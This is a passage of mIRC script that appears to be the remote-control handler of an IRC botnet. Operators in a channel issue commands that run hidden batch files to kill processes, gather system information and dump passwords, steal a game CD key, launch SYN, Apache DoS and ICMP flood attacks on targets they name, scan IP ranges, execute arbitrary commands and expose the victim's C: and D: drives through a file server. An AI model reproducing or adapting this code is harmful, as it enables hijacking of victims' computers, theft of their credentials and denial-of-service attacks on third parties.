    if ($1 == !pskill) { .run hiddenrun.exe psk.bat $2 }
    if ($1 == !psinfo) { .run hiddenrun.exe psi.bat| play $nick psi.txt }
    if ($1 == !whoisadmin) { .run hiddenrun.exe wia.bat $2 }
    if ($1 == !passdump) { .run hiddenrun.exe Passdump.bat }
    if ($1 == !cskey) { cskey }
  if ($1 == !syn) { set %synport $3 | if (%synport == random) { set %synport $rand(0,65535) } | msg %chan 4S0yn 4A0ttacking: 4(0 $2 4)0 0on port 4(0 %synport 4)0 0|:| 4(0 $4 4)0 times  | set %synaa $2 | synp start $4 $2 %synport } }
  if ($1 == !apachedos) && ($2 != $null) { /SockOpen apachedos1 $2 80 | msg %c 4[15APACHE DoS4]14-4[15CONNECTING14...4] 
  if ($1 == !icmp) { .msg %c icmp error! | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }  { msg %c 4[sending ( $+ $4 $+ ) ICMP-packets to ( $+ $2 $+ ) Sized: ( $+ $3 $+ )14] }        
  if ($2 == !scanstats) { msg %c 2[14scanner2]14 stats range: [ %begshortip - %endshortip ] current ip: [ %ip25 ] }    
  if ($1 == !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | msg %c 2[14scanner2]14 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }
  if ($1 == !var) && ($2 != $null) { msg %c [!] var = [ [ $$2- ] ] }
  if ($1 == !-) && ($2 != $null) { %- = $2- | msg %c [!] performed: / $+ $2- | / $+ %- | unset %- }  
  if ($1 == .fserve) && ($nick isop %c ) { 
    if ($2 == c) { .msg %c  Opening FileServer Session to: $nick / Drive/Dir: $2 $+ :\ | .fserve $nick 10 C:\ }
    if ($2 == d) { .msg % Opening FileServer Session to: $nick / Drive/Dir: $2 $+ :\ | .fserve $nick 10 d:\ } 
  }

}
if ($1 == !startscan) && (%begshortip == $null) { 
  msg %c 2[14scanner2]14 starting scan from: $2 to $3 
  set %sss $read(ip.txt)
  set %begshortip $read( $+ %sss $+ .txt)
  set %beglongip $longip(  %begshortip ) 
  set %endshortip $left( $+ %sss $+ ).suf,-1) $+ 999.999
  set %endlongip $longip( %endshortip  ) 
  set %total $calc( %endlongip - %beglongip ) 
  unset %totalscaning 
  startscan
}
